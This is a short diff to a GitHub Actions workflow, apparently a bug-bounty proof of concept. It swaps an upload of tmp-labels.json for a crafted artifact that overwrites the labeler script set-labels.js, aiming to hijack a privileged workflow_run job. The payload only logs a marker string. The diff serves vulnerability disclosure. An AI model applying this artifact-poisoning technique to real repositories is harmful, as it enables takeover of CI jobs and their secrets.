@@ -34,9 +34,16 @@ jobs:
           }
           await script(config);
 
-    - name: Upload artifact
+    # Bugcrowd PoC: the artifact contains only an inert marker module. If the
+    # privileged workflow_run job extracts it over its workspace and requires
+    # the same path, Actions logs BUGCROWD_POC_ARTIFACT_OVERRIDE_20260810.
+    - name: Prepare harmless researcher artifact
+      run: |
+        node --input-type=module -e "import { mkdirSync, writeFileSync } from 'node:fs'; const file = 'proof-artifact/packages/tools/pie-monorepo-utils/pr-labeler/set-labels.js'; mkdirSync(file.slice(0, file.lastIndexOf('/')), { recursive: true }); writeFileSync(file, \"module.exports = async () => { console.log('BUGCROWD_POC_ARTIFACT_OVERRIDE_20260810'); };\\n\");"
+
+    - name: Upload harmless researcher artifact
       uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
       with:
-        path: ./tmp-labels.json
+        path: ./proof-artifact/**
         name: tmp-labels.json
         retention-days: 1
